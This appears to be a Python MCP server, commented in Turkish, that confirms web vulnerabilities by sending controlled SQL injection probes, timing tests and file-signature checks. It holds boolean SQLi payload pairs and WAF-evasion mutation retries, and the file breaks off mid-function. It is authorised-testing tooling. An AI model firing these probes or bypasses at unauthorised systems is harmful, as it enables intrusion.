#!/usr/bin/env python3
"""
mcp-validator: Deterministik Exploit Doğrulama Sunucusu (XBOW-tarzı validator)
==============================================================================
CCO'nun en kritik eksiğini kapatır: bir bulgunun *gerçekten exploit edilebilir*
olduğunu **deterministik oracle'larla** kanıtlar — LLM görüşü değil, ölçülebilir
kanıt. Felsefe XBOW ile aynı: **"yaratıcı AI keşfeder, mantık doğrular."**

Her validator çok sayıda kontrollü istek atar ve nesnel bir oracle uygular:
  • Differential analysis  — TRUE/FALSE koşul yanıt farkı (boolean SQLi)
  • Benzersiz canary token  — kaçışsız (unescaped) yansıma (XSS), echo (cmdi)
  • Aritmetik değerlendirme — {{a*b}} = a*b (SSTI), rastgele a,b ile coincidence'sız
  • İçerik imzası            — root:x:0:0 (LFI/XXE), win.ini (path traversal)
  • OOB korelasyonu          — interactsh callback'inde benzersiz token (SSRF)
  • Zamanlama (statistical)  — sleep(d) ile orantılı gecikme (blind SQLi/cmdi)
  • Konum (Location) oracle  — açık yönlendirme hedef host doğrulaması

Sonuç şeması (ValidationReport): verdict (CONFIRMED|UNCONFIRMED|INCONCLUSIVE|ERROR),
confidence (oracle gücüne göre deterministik), oracle, evidence, reproduction
(curl), false_positive_guard. Her doğrulama ~/.cco/validations/ altına audit-trail
olarak yazılır (XBOW-tarzı reproducible kanıt).

> Yalnızca yazılı izinli / scope içi hedeflerde kullan. Bu tool aktif istek atar.
"""

import inspect
import os
import re
import json
import time
import hashlib
import hmac
import secrets
import difflib
import sqlite3
import sys
import tempfile
from contextlib import nullcontext
from statistics import median, pstdev
from datetime import datetime, timezone
from urllib.parse import (urlparse, urlunparse, parse_qsl, urlencode, quote, quote_plus, urljoin, unquote)

import requests
from mcp.server.fastmcp import FastMCP

_SERVER_DIR = os.path.dirname(os.path.abspath(__file__))
if _SERVER_DIR not in sys.path:
    sys.path.insert(0, _SERVER_DIR)

from cco_validator_core import (  # noqa: E402
    SCHEMA_VERSION,
    VALIDATOR_VERSION,
    analyze_differential_observations as _analyze_differential_observations,
    artifact_is_valid,
    artifact_is_current,
    load_validation,
    persist_result,
    redact_value,
    response_evidence,
    safe_curl,
)
from cco_validator_core.waf_retry import (  # noqa: E402
    MAX_WAF_RETRIES,
    apply_ops,
    mutation_sets,
    response_is_waf_block,
    vendor_from_response,
)

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

CCO_HOME = os.environ.get("CCO_HOME", os.path.expanduser("~/.cco"))
VALID_DIR = os.path.join(CCO_HOME, "validations")
OOB_DIR = os.path.join(VALID_DIR, "oob_pending")

UA = "CCO-Validator/1.0"
DEFAULT_TIMEOUT = int(os.environ.get("CCO_VALIDATOR_TIMEOUT", "20"))

# Verdict sabitleri
CONFIRMED = "CONFIRMED"
UNCONFIRMED = "UNCONFIRMED"
INCONCLUSIVE = "INCONCLUSIVE"
ERROR = "ERROR"

# Oracle gücü → deterministik confidence (LLM yok)
ORACLE_CONFIDENCE = {
    "browser_execution": 0.99,
    "oob_correlation": 0.99,
    "file_signature": 0.98,
    "arithmetic_eval": 0.97,
    "echo_token": 0.96,
    "redirect_location": 0.95,
    "content_match": 0.90,
    "differential_boolean": 0.90,
    "timing_statistical": 0.82,
    "unescaped_reflection": 0.75,
    "differential_deserialization": 0.85,
    "token_differential": 0.88,
    "token_roundtrip": 0.90,
}

mcp = FastMCP(
    "validator",
    instructions="Deterministik exploit doğrulama — bir bulgunun gerçekten "
                 "exploit edilebilir olduğunu nesnel oracle'larla kanıtlar (XBOW-tarzı)."
)


# ───────────────────────────── HTTP yardımcıları ─────────────────────────────
def _headers(headers_json: str) -> dict:
    try:
        h = json.loads(headers_json) if headers_json else {}
    except Exception:
        h = {}
    if not isinstance(h, dict):
        h = {}
    h.setdefault("User-Agent", UA)
    return h


_CREDENTIAL_HEADERS = {
    "authorization", "cookie", "proxy-authorization", "x-api-key", "api-key"
}


def _strict_identity_headers(headers_json: str) -> tuple[dict, str]:
    """Parse an identity header object without silently degrading to anonymous."""
    try:
        headers = json.loads(headers_json) if headers_json else {}
    except Exception:
        return {}, "headers_json geçerli JSON değil"
    if not isinstance(headers, dict):
        return {}, "headers_json JSON object olmalı"
    if not any(str(key).lower() in _CREDENTIAL_HEADERS and str(value).strip()
               for key, value in headers.items()):
        return {}, "en az bir credential header gerekli"
    headers = {str(key): str(value) for key, value in headers.items()}
    headers.setdefault("User-Agent", UA)
    return headers, ""


def _identity_fingerprint(headers: dict) -> str:
    material = "\n".join(
        f"{str(key).lower()}:{value}"
        for key, value in sorted(headers.items(), key=lambda item: str(item[0]).lower())
        if str(key).lower() in _CREDENTIAL_HEADERS
    )
    return hashlib.sha256(material.encode("utf-8")).hexdigest()


def _anonymous_headers(headers: dict) -> dict:
    """Keep program headers without forwarding identity credentials."""
    secret = re.compile(r"(authorization|cookie|token|secret|session|password|api[-_]?key|^x[-_]auth$)", re.I)
    clean = {str(key): str(value) for key, value in headers.items()
             if str(key).lower() not in _CREDENTIAL_HEADERS and not secret.search(str(key))}
    clean.setdefault("User-Agent", UA)
    return clean


def _request(method: str, url: str, *, params=None, data=None, headers=None,
             allow_redirects=True, timeout=DEFAULT_TIMEOUT, observe_session=True) -> dict:
    """Tek HTTP isteği → normalize edilmiş yanıt (status, len, time, text, headers).

    Faz 4: egress istemcisi uzerinden gider — redirect hop'lari tek tek
    dogrulanir ve her gercek istek sayilir (request_count).
    """
    from cco_validator_core.egress import egress_request

    extra = tuple(h.strip() for h in
                  os.environ.get("CCO_EGRESS_EXTRA_HOSTS", "").split(",") if h.strip())
    budget_raw = os.environ.get("CCO_EGRESS_REQUEST_BUDGET", "").strip()
    budget = int(budget_raw) if budget_raw.isdigit() else None
    return egress_request(method, url, params=params, data=data, headers=headers,
                          allow_redirects=allow_redirects, timeout=timeout,
                          extra_hosts=extra, request_budget=budget, observe_session=observe_session)


def _normalize_carrier(carrier: str, method: str = "GET") -> str:
    norm = {"body": "form"}.get(str(carrier or "").strip().lower(), str(carrier or "").strip().lower())
    if norm:
        return norm
    return "query" if str(method or "GET").upper() == "GET" else "form"


def _apply_body_content_type(headers: dict, carrier: str, body_template: str) -> dict:
    hdrs = dict(headers or {})
    if body_template and not any(k.lower() == "content-type" for k in hdrs):
        norm = _normalize_carrier(carrier, "POST")
        if norm == "json":
            hdrs["Content-Type"] = "application/json"
        elif norm == "form":
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    return hdrs


def _render_body_template(body_template: str, payload: str, headers: dict) -> str:
    ctype = next((str(v) for k, v in (headers or {}).items() if str(k).lower() == "content-type"), "")
    if "json" in ctype.lower():
        replacement = json.dumps(payload)[1:-1]
    elif "x-www-form-urlencoded" in ctype.lower():
        replacement = quote_plus(payload)
    else:
        replacement = payload
    return body_template.replace("{{PAYLOAD}}", replacement)


def _send_payload(url: str, payload: str, *, param: str = "", method: str = "GET",
                  body_template: str = "", headers: dict = None,
                  allow_redirects: bool = True, timeout: int = DEFAULT_TIMEOUT,
                  carrier: str = "query") -> dict:
    """Payload'u doğru yere yerleştirip gönder. Enjeksiyon noktası seçenekleri:
      • GET + param   → query parametresine yaz
      • GET + url'de {{PAYLOAD}} → URL içine göm
      • POST + body_template ({{PAYLOAD}} içeren) → gövdeye göm
      • POST + param  → form alanına yaz
      • carrier='cookie' + param → Cookie başlığına yaz (ör. TrackingId)
    """
    request_method = method.upper()
    norm_carrier = _normalize_carrier(carrier, request_method)
    headers = _apply_body_content_type(headers or {}, norm_carrier, body_template)
    if request_method not in {"GET", "POST", "PUT", "PATCH", "HEAD", "OPTIONS"}:
        return {"ok": False, "status": None, "error": "unsupported request method"}
    from cco_validator_core.experiment_context import payload_request
    try:
        observed = payload_request(payload)
    except (ValueError, TypeError, KeyError, IndexError):
        return {"ok": False, "status": None, "error": "observed request mutation failed"}
    if observed is not None:
        hdrs = dict(observed.get("headers") or {})
        for name, value in headers.items():
            if name.lower() not in {k.lower() for k in hdrs}:
                hdrs[name] = value
        body = observed.get("data")
        if observed.get("json_body") is not None:
            body = json.dumps(observed["json_body"], ensure_ascii=False, separators=(",", ":")).encode()
        elif isinstance(body, str):
            body = body.encode()
        return _request(observed["method"], observed["url"], data=body, headers=hdrs,
                        allow_redirects=allow_redirects, timeout=timeout)

    def body_data() -> bytes | None:
        if not body_template:
            return None
        return _render_body_template(body_template, payload, headers).encode("utf-8")

    if carrier == "cookie" and param:
        hdrs = dict(headers)
        cookie_key = next((k for k in hdrs if k.lower() == "cookie"), "Cookie")
        previous = str(hdrs.get(cookie_key, ""))
        pairs = [part.strip() for part in previous.split(";") if part.strip()
                 and part.strip().partition("=")[0].strip().lower() != param.lower()]
        pairs.append(f"{param}={payload}")
        hdrs[cookie_key] = "; ".join(pairs)
        return _request(request_method, url, data=body_data(), headers=hdrs,
                        allow_redirects=allow_redirects, timeout=timeout)
    if carrier == "header" and param:
        hdrs = dict(headers)
        hdrs[param] = payload
        return _request(request_method, url, data=body_data(), headers=hdrs,
                        allow_redirects=allow_redirects, timeout=timeout)
    if carrier == "path" and param:
        full = url.replace("{" + param + "}", quote(payload, safe=""))
        return _request(request_method, full, data=body_data(), headers=headers,
                        allow_redirects=allow_redirects, timeout=timeout)
    if request_method == "GET":
        if param:
            parsed = urlparse(url)
            q = dict(parse_qsl(parsed.query, keep_blank_values=True))
            q[param] = payload
            full = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
            return _request("GET", full, headers=headers,
                            allow_redirects=allow_redirects, timeout=timeout)
        if "{{PAYLOAD}}" in url:
            full = url.replace("{{PAYLOAD}}", quote(payload, safe=""))
            return _request("GET", full, headers=headers,
                            allow_redirects=allow_redirects, timeout=timeout)
        return _request("GET", url, params={"q": payload}, headers=headers,
                        allow_redirects=allow_redirects, timeout=timeout)
    # Preserve the request method and all sibling fields in the captured body.
    if body_template and "{{PAYLOAD}}" in body_template:
        return _request(request_method, url, data=body_data(), headers=headers,
                        allow_redirects=allow_redirects, timeout=timeout)
    if body_template and param:
        parsed = urlparse(url)
        query = dict(parse_qsl(parsed.query, keep_blank_values=True))
        query[param] = payload
        full = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
        return _request(request_method, full, data=body_data(), headers=headers,
                        allow_redirects=allow_redirects, timeout=timeout)
    if param:
        return _request(request_method, url, data={param: payload}, headers=headers,
                        allow_redirects=allow_redirects, timeout=timeout)
    return _request(request_method, url, data={"q": payload}, headers=headers,
                    allow_redirects=allow_redirects, timeout=timeout)


def _ratio(a: str, b: str) -> float:
    """İki yanıt gövdesinin içerik benzerliği (0..1). Hız için kırpılır."""
    a = (a or "")[:20000]
    b = (b or "")[:20000]
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).ratio()


def _similar(r1: dict, r2: dict) -> float:
    """Status + uzunluk + içerik birleşik benzerliği (0..1)."""
    if r1.get("status") != r2.get("status"):
        return 0.0
    l1, l2 = r1.get("len", 0), r2.get("len", 0)
    len_sim = 1.0 if max(l1, l2) == 0 else 1 - abs(l1 - l2) / max(l1, l2)
    return round(0.4 * len_sim + 0.6 * _ratio(r1.get("text", ""), r2.get("text", "")), 4)


def _curl(method: str, url: str, body: str = "", headers: dict = None) -> str:
    return safe_curl(method, url, body, headers)


def _reproduction(method: str, url: str, *, param: str = "", payload: str = "",
                  body_template: str = "", headers: dict | None = None,
                  carrier: str = "query") -> str:
    """Render the exact injected request while keeping identity material redacted."""
    from cco_validator_core.experiment_context import payload_request
    observed = payload_request(payload)
    if observed is not None:
        body = (json.dumps(observed["json_body"], ensure_ascii=False, separators=(",", ":"))
                if observed.get("json_body") is not None else observed.get("data") or "")
        return _curl(observed["method"], observed["url"], body, observed.get("headers"))
    if carrier == "path" and param:
        return _curl(method, url.replace("{" + param + "}", quote(payload, safe="")), headers=headers)
    if carrier == "header" and param:
        return _curl(method, url, headers={**(headers or {}), param: payload})
    if carrier == "cookie" and param:
        hdrs = dict(headers or {})
        hdrs["Cookie"] = f"{param}={payload}"
        return _curl(method, url, headers=hdrs)
    if method.upper() == "GET":
        if param:
            parsed = urlparse(url)
            query = dict(parse_qsl(parsed.query, keep_blank_values=True))
            query[param] = payload
            url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
        elif "{{PAYLOAD}}" in url:
            url = url.replace("{{PAYLOAD}}", quote(payload, safe=""))
        return _curl("GET", url, headers=headers)
    if body_template and "{{PAYLOAD}}" in body_template:
        hdrs = _apply_body_content_type(headers or {}, carrier, body_template)
        return _curl(method, url, _render_body_template(body_template, payload, hdrs), hdrs)
    if param:
        return _curl(method, url, urlencode({param: payload}), headers)
    return _curl(method, url, urlencode({"q": payload}), headers)


def _persist(res: dict) -> None:
    """Compatibility wrapper around the Validator V2 artifact writer."""
    stored = persist_result(res, VALID_DIR)
    res.clear()
    res.update(stored)


def _build_validator_completion(
    *,
    target_url: str,
    param: str,
    method: str,
    carrier: str,
    profile: str,
    required_checks: list[str],
) -> dict | None:
    try:
        from cco_validator_core.evidence import (
            current_policy_hash,
            current_scope_revision,
            current_validation_context,
            redact_url,
        )
        import evidence_trust as _trust
        if _trust.public_only():
            return None
        from signed_completion import build_signed_completion, compute_check_revision
        ctx = current_validation_context()
        scope_rev = current_scope_revision()
        pol_hash = current_policy_hash()
        safe_url = redact_url(target_url)
        return build_signed_completion(
            run_id=str(ctx.get("run_id") or "validator-standalone"),
            target=safe_url,
            url=safe_url,
            param=param,
            method=method.upper(),
            carrier=_normalize_carrier(carrier, method),
            identity=str(ctx.get("identity") or "anonymous"),
            profile=profile,
            target_scope=scope_rev,
            check_revision=compute_check_revision(scope_rev, pol_hash, profile, required_checks),
            required_checks=required_checks,
            completed_checks=required_checks,
            completion_status="completed_clean",
            findings_count=0,
        )
    except (ImportError, ValueError, OSError):
        return None


def _direct_context_scope(
    *,
    target_url: str,
    param: str,
    method: str,
    carrier: str,
    vuln_class: str,
):
    from contextlib import nullcontext
    from cco_validator_core.evidence import current_validation_context, validation_context
    if current_validation_context() or not param:
        return nullcontext()
    return validation_context({
        "url": target_url,
        "param": param,
        "method": method.upper(),
        "carrier": _normalize_carrier(carrier, method),
        "identity": "anon",
        "vuln_class": vuln_class,
        "run_id": "validator-standalone",
    })


def _result(vuln_type: str, target: str, verdict: str, oracle: str,
             evidence: dict, reproduction, notes: str = "",
             severity: str = "high", guard: dict | None = None,
             request_evidence: list | None = None,
             signed_completion: dict | None = None) -> str:
    confidence = ORACLE_CONFIDENCE.get(oracle, 0.0) if verdict == CONFIRMED else 0.0
    if isinstance(reproduction, str):
        reproduction = [reproduction]
    guard = guard or {}
    res = {
        "validator": "cco-deterministic-validator",
        "schema_version": SCHEMA_VERSION,
        "validator_version": VALIDATOR_VERSION,
        "validation_id": secrets.token_hex(16),
        "vuln_type": vuln_type,
        "target": target,
        "verdict": verdict,
        "confidence": confidence,
        "severity": severity if verdict == CONFIRMED else "info",
        "oracle": oracle,
        "evidence": evidence,
        "reproduction": reproduction,
        "request_evidence": request_evidence or [],
        "guard": {
            "prerequisites": list(guard.get("prerequisites", [])),
            "controls": list(guard.get("controls", [])),
            "transport_ok": bool(guard.get("transport_ok", verdict not in {ERROR, INCONCLUSIVE})),
            "decision_rule": guard.get("decision_rule", oracle),
            "limitations": list(guard.get("limitations", [])),
        },
        "false_positive_guard": (
            "Doğrulama Validator V2 kontrol matrisi ve deterministik oracle ile yapıldı; "
            "reportable yalnızca atomik kanıt artifact'i üretildiyse true olur."
        ),
        "notes": notes,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    if signed_completion is not None and verdict == UNCONFIRMED:
        res["signed_completion"] = signed_completion
    _persist(res)
    return json.dumps(res, indent=2, ensure_ascii=False)


# ───────────────────────── SSTI aritmetik oracle (pure) ─────────────────────────
def _ssti_oracle(text: str, a: int, b: int) -> bool:
    """Yanıtta a*b SONUCU var ama '<a>*<b>' ifadesi YOK → template değerlendirildi."""
    text = text or ""
    product = str(a * b)
    return product in text and f"{a}*{b}" not in text


# ───────────────────────── Differential boolean (pure) ─────────────────────────
def _boolean_confirms(base: dict, t_resp: dict, f_resp: dict,
                      same_thr: float = 0.95, diff_thr: float = 0.95) -> bool:
    """TRUE koşulu baseline'a benziyor, FALSE koşulu belirgin farklı → boolean SQLi."""
    if not (base.get("ok") and t_resp.get("ok") and f_resp.get("ok")):
        return False
    if not all(isinstance(row.get("status"), int) and 200 <= row["status"] < 300
               for row in (base, t_resp, f_resp)):
        return False
    sim_true = _similar(base, t_resp)
    sim_false = _similar(base, f_resp)
    sim_tf = _similar(t_resp, f_resp)
    return sim_true >= same_thr and sim_tf < diff_thr and sim_true > sim_false


# ───────────────────────── Zamanlama oracle (statistical) ─────────────────────────
def _median(xs):
    return median(xs) if xs else 0.0


def _timing_confirm(send_fn, baseline_time: float, d1: int, d2: int):
    """Interleaved timing oracle with transport, scaling, and dispersion guards."""
    samples = {d1: [], d2: []}
    responses = []
    for delay in (d2, d1, d1, d2):
        response = send_fn(delay)
        responses.append(response)
        if not response.get("ok") or response.get("status") is None:
            return False, {
                "baseline_s": round(baseline_time, 3),
                "sample_count": len(responses),
                "transport_ok": False,
                "decision": "transport failure",
            }
        samples[delay].append(float(response.get("time") or 0.0))

    t1 = median(samples[d1])
    t2 = median(samples[d2])
    all_times = samples[d1] + samples[d2]
    dispersion = pstdev(all_times) if len(all_times) > 1 else 0.0
    scaled = (t2 - t1) >= (d2 - d1) * 0.6
    above_base = (t1 - baseline_time) >= d1 * 0.6
    statuses_stable = len({response.get("status") for response in responses}) == 1
    effect_size = (t2 - t1) / max(dispersion, 0.05)
    confirmed = scaled and above_base and statuses_stable and effect_size >= 1.0
    return confirmed, {
        "baseline_s": round(baseline_time, 3),
        f"delay_{d1}s_samples": [round(item, 3) for item in samples[d1]],
        f"delay_{d2}s_samples": [round(item, 3) for item in samples[d2]],
        f"delay_{d1}s_median": round(t1, 3),
        f"delay_{d2}s_median": round(t2, 3),
        "sample_count": len(all_times),
        "dispersion_s": round(dispersion, 3),
        "effect_size": round(effect_size, 3),
        "transport_ok": True,
        "statuses_stable": statuses_stable,
        "scales_with_delay": scaled,
        "above_baseline": above_base,
    }


# İçerik imzaları
LINUX_FILE_SIG = re.compile(r"root:.*?:0:0:")
WIN_FILE_SIG = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.I)
HOST_TOKEN_RE = re.compile(r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,63}\b")


def _decoded_linux_signature(text: str):
    import base64

    for token in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text or ""):
        try:
            decoded = base64.b64decode(token, validate=False).decode("utf-8", "ignore")
        except Exception:
            continue
        match = LINUX_FILE_SIG.search(decoded)
        if match:
            return match
    return None


def _normalize_host(candidate: str) -> str:
    candidate = (candidate or "").strip()
    if not candidate:
        return ""
    if "://" not in candidate:
        candidate = "//" + candidate.lstrip(".")
    try:
        host = (urlparse(candidate).hostname or "").strip(".")
    except Exception:
        return ""
    if not host or not HOST_TOKEN_RE.fullmatch(host):
        return ""
    return host.lower()


def _oob_challenge_path(token: str) -> str:
    safe = re.sub(r"[^a-zA-Z0-9_-]", "", token)[:64]
    return os.path.join(OOB_DIR, f"{safe}.json")


def _oob_fernet(*, create_key=True):
    mem_dir = os.path.abspath(os.path.join(_SERVER_DIR, "..", "mcp-memory-server"))
    if mem_dir not in sys.path:
        sys.path.insert(0, mem_dir)
    from credential_vault import CredentialVault
    return CredentialVault(CCO_HOME, create_key=create_key, initialize_db=False).fernet


def _store_oob_challenge(token: str, host: str, target_url: str, vuln_type: str = "SSRF",
                         param: str = "", run_id: str = "", sent_at: int = 0,
                         target_binding: str = "", probe_binding: str = "",
                         scope_revision: str = "", policy_hash: str = "") -> dict:
    from cco_validator_core.evidence import trust
    record = {
        "schema": "validator-oob-challenge/3",
        "token": token,
        "host": host,
        "target_ciphertext": _oob_fernet().encrypt(target_url.encode()).decode("ascii"),
        "vuln_type": vuln_type,
        "param": param,
        "run_id": run_id,
        "sent_at": sent_at,
        "target_binding": target_binding,
        "probe_binding": probe_binding,
        "scope_revision": scope_revision,
        "policy_hash": policy_hash,
        "issued_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": int(time.time()) + 3600,
    }
    path = _oob_challenge_path(token)
    os.makedirs(OOB_DIR, mode=0o700, exist_ok=True)
    fd, temp_path = tempfile.mkstemp(prefix=".oob-", suffix=".tmp", dir=OOB_DIR)
    try:
        os.chmod(temp_path, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as handle:
            json.dump(trust.attest(record, "validator-oob-challenge/1"), handle, indent=2, ensure_ascii=False)
            handle.flush()
            os.fsync(handle.fileno())
        os.replace(temp_path, path)
    finally:
        if os.path.exists(temp_path):
            try:
                os.unlink(temp_path)
            except OSError:
                pass
    return record


def _load_oob_challenge(token: str) -> dict | None:
    path = _oob_challenge_path(token)
    if not os.path.exists(path):
        return None
    try:
        with open(path, encoding="utf-8") as handle:
            stored = json.load(handle)
    except Exception:
        return None
    signed = isinstance(stored, dict) and isinstance(stored.get("payload"), dict)
    if signed:
        from cco_validator_core.evidence import trust
        record = stored["payload"]
        if (record.get("schema") not in {"validator-oob-challenge/2", "validator-oob-challenge/3"}
                or not trust.verify(trust.canonical_bytes(record), stored, "validator-oob-challenge/1")):
            return None
        if record.get("schema") == "validator-oob-challenge/3":
            try:
                record["target_url"] = _oob_fernet(create_key=False).decrypt(
                    record["target_ciphertext"].encode("ascii")).decode("utf-8")
            except Exception:
                return None
    else:
        record = stored
    if not isinstance(record, dict) or record.get("token") != token:
        return None
    try:
        if int(record.get("expires_at", 0) or 0) < int(time.time()):
            return None
    except (TypeError, ValueError):
        return None
    record["collector_eligible"] = signed
    return record


def _poll_hosts(poll_output: str) -> set[str]:
    hosts = set()
    for token in HOST_TOKEN_RE.findall(poll_output or ""):
        host = _normalize_host(token)
        if host:
            hosts.add(host)
    for token in re.findall(r"https?://[^\s'\"<>]+", poll_output or ""):
        host = _normalize_host(token)
        if host:
            hosts.add(host)
    return hosts


def _oob_host_in_scope(host: str) -> bool:
    """Callbacks must be explicitly included in the active scope."""
    try:
        scripts = os.path.abspath(os.path.join(_SERVER_DIR, "..", "..", "scripts"))
        if scripts not in sys.path:
            sys.path.insert(0, scripts)
        from policy_engine import ScopeResolver
        return ScopeResolver().permits_url(f"https://{host}/")
    except (ImportError, OSError, RuntimeError, ValueError):
        return False


# ════════════════════════════════ TOOLS ════════════════════════════════

@mcp.tool()
def validate_sqli(target_url: str, param: str = "", method: str = "GET",
                  body_template: str = "", headers_json: str = "{}",
                  carrier: str = "query", boolean_only: bool = False,
                  baseline_value: str = "") -> str:
    """SQL Injection'ı DETERMİNİSTİK doğrula — differential (boolean) + error +
    time-based oracle. LLM tahmini değil; TRUE/FALSE koşul yanıt farkı ölçülür.

    Args:
        target_url: Hedef URL (örn http://t/item.php?id=1)
        param: Enjekte edilecek query/form parametresi (örn 'id')
        method: GET veya POST
        body_template: POST için '{{PAYLOAD}}' içeren gövde şablonu
        headers_json: Ek HTTP başlıkları (JSON; örn auth cookie)
        carrier: 'query' (varsayılan), 'form', 'json' veya 'cookie'
        boolean_only: Only SELECT-compatible boolean comparisons; no timing probes.
        baseline_value: Observed benign value when payload is injected in a POST body template.
    """
    from cco_validator_core.controls import ControlTrace

    H = _headers(headers_json)
    norm_carrier = _normalize_carrier(carrier, method)
    trace = ControlTrace()

    def send(payload, role="sql-probe", baseline=False, **kwargs):
        response = _send_payload(target_url, payload, param=param, method=method,
                                 body_template=body_template, headers=H, carrier=norm_carrier, **kwargs)
        return trace.observe(response, role, baseline=baseline)

    # orijinal/control değer
    base_val = ""
    if norm_carrier == "cookie" and param:
        # Baz, çağıranın Cookie başlığındaki gerçek taşıyıcı değeri olmalı;
        # yoksa TRUE/FALSE çiftleri anlamsız bir değere eklenir.
        for part in (H.get("Cookie", "") or "").split(";"):
            part = part.strip()
            if part.startswith(f"{param}="):
                base_val = part.split("=", 1)[1]
                break
    if method.upper() == "GET" and param and not base_val:
        q = dict(parse_qsl(urlparse(target_url).query, keep_blank_values=True))
        base_val = q.get(param, "1")
    if not base_val and baseline_value:
        base_val = str(baseline_value)
    from cco_validator_core.experiment_context import observed_baseline
    base_val = observed_baseline(base_val or "1")
    with _direct_context_scope(
        target_url=target_url, param=param, method=method, carrier=norm_carrier, vuln_class="sql_injection",
    ):
        return _validate_sqli_inner(
            target_url=target_url, param=param, method=method, body_template=body_template,
            H=H, carrier=norm_carrier, boolean_only=boolean_only, trace=trace, send=send, base_val=base_val,
        )


def _validate_sqli_inner(
    *,
    target_url: str,
    param: str,
    method: str,
    body_template: str,
    H: dict,
    carrier: str,
    boolean_only: bool,
    trace,
    send,
    base_val: str,
) -> str:
    from cco_validator_core.controls import usable_control

    base = send(base_val, role="baseline-1", baseline=True)
    meaningful_baseline = bool(base.get("text", "").strip())
    try:
        baseline_json = json.loads(base.get("text", ""))
        if baseline_json in (None, [], {}):
            meaningful_baseline = False
        if isinstance(baseline_json, dict):
            if baseline_json.get("error") or baseline_json.get("success") is False:
                meaningful_baseline = False
            result_keys = {"records", "rows", "results", "data", "items"} & baseline_json.keys()
            if result_keys and not any(baseline_json[key] for key in result_keys):
                meaningful_baseline = False
    except (ValueError, TypeError):
        pass
    if not usable_control(base, baseline=True) or not meaningful_baseline:
        return _result("SQL Injection", target_url, INCONCLUSIVE, "differential_boolean",
                       {"error": base.get("error")}, "-",
                       notes="Baseline isteği başarısız (hedef erişilemez?).")
    base2 = send(base_val, role="baseline-2", baseline=True)
    baseline_stability = _similar(base, base2) if base2.get("ok") else 0.0
    baseline_stable = (usable_control(base2, baseline=True) and base2.get("status") == base.get("status")
                       and baseline_stability >= 0.95)
    if not baseline_stable:
        return _result(
            "SQL Injection", target_url, INCONCLUSIVE, "differential_boolean",
            {"baseline_status": [base.get("status"), base2.get("status")],
             "baseline_similarity": round(baseline_stability, 4)},
            "-",
            notes="Baseline kararsız (jitter/dinamik içerik) — differential geçersiz.",
            guard={
                "prerequisites": ["stable baseline"],
                "controls": ["repeated baseline", "status + similarity stability"],
                "transport_ok": True,
                "limitations": ["dynamic content defeats boolean differential"],
            },
            request_evidence=[response_evidence(base, "baseline-1", 0),
                              response_evidence(base2, "baseline-2", 0)],
        )

    # 1) Differential boolean — aday sinyal ters sırada ikinci turda tekrarlanmalı.
    pairs = [
        (f"{base_val} AND 1=1", f"{base_val} AND 1=2"),
        (f"{base_val}' AND '1'='1", f"{base_val}' AND '1'='2"),
        (f"{base_val}\" AND \"1\"=\"1", f"{base_val}\" AND \"1\"=\"2"),
        (f"{base_val}) AND (1=1", f"{base_val}) AND (1=2"),
    ]
    if boolean_only:
        # Explicitly bounded SELECT profile: numeric and quoted string
        # predicates only. A clean result covers these two dialect shapes.
        pairs = pairs[:2]
    differential_candidates = []
    waf_retries_left = MAX_WAF_RETRIES
    waf_retry_meta = None
    for t_pl, f_pl in pairs:
        tr = send(t_pl)
        fr = send(f_pl)
        if (response_is_waf_block(tr) or response_is_waf_block(fr)) and waf_retries_left > 0:
            blocked = tr if response_is_waf_block(tr) else fr
            for variant in mutation_sets(t_pl, "sql_injection", blocked, limit=waf_retries_left):
                if waf_retries_left <= 0:
                    break
                ops = variant.get("operators") or []
                t2 = apply_ops(t_pl, ops)
                f2 = apply_ops(f_pl, ops)
                if t2 == t_pl and f2 == f_pl:
                    continue
                waf_retries_left -= 1
                tr = send(t2)
                fr = send(f2)
                waf_retry_meta = {
                    "operators": ops, "true_payload": t2, "false_payload": f2,
                    "vendor": vendor_from_response(blocked) or vendor_from_response(tr),
                }
                t_pl, f_pl = t2, f2
                if not (response_is_waf_block(tr) or response_is_waf_block(fr)):
                    break
        reflected = t_pl in tr.get("text", "") or f_pl in fr.get("text", "")
        first_round = not reflected and _boolean_confirms(base, tr, fr)
        if not first_round:
            continue
        # Request-order drift guard: second round FALSE then TRUE.
        fr2 = send(f_pl)
        tr2 = send(t_pl)
        reflected2 = t_pl in tr2.get("text", "") or f_pl in fr2.get("text", "")
        second_round = not reflected2 and _boolean_confirms(base, tr2, fr2)
        rounds = [
            {"order": ["true", "false"], "confirmed": first_round},
            {"order": ["false", "true"], "confirmed": second_round},
        ]
        differential_candidates.append({"true_payload": t_pl, "false_payload": f_pl,
                                        "rounds": rounds})
        if second_round:
            evidence = {"true_payload": t_pl, "false_payload": f_pl,
                        "sim_true_vs_baseline": _similar(base, tr),
                        "sim_true_vs_false": _similar(tr, fr),
                        "baseline_stability": round(baseline_stability, 4),
                        "true_status_len": [tr["status"], tr["len"]],
                        "false_status_len": [fr["status"], fr["len"]],
                        "rounds": rounds}
            if waf_retry_meta:
                evidence["waf_retry"] = waf_retry_meta
            return _result(
                "SQL Injection (boolean-based)", target_url, CONFIRMED,
                "differential_boolean",
                evidence,
                [_reproduction(method, target_url, param=param, payload=t_pl,
                               body_template=body_template, headers=H, carrier=carrier),
                 _reproduction(method, target_url, param=param, payload=f_pl,
                               body_template=body_template, headers=H, carrier=carrier)],
                notes="TRUE/FALSE farkı ters istek sırasındaki ikinci turda tekrarlandı.",
                guard={
                    "prerequisites": ["reachable baseline", "stable baseline"],
                    "controls": ["repeated stable baseline", "two consistent differential rounds",
                                 "reversed request order"],
                    "transport_ok": True,
                    "decision_rule": "both TRUE/FALSE rounds must match baseline differential",
                },
                request_evidence=[response_evidence(base, "baseline", 0),
                                  response_evidence(tr, "true-1", 0),
                                  response_evidence(fr, "false-1", 0),
                                  response_evidence(fr2, "false-2", 0),
                                  response_evidence(tr2, "true-2", 0)])

    if boolean_only:
        verdict = UNCONFIRMED if trace.complete and not differential_candidates else INCONCLUSIVE
        completion_env = (
            _build_validator_completion(
                target_url=target_url,
                param=param,
                method=method,
                carrier=carrier,
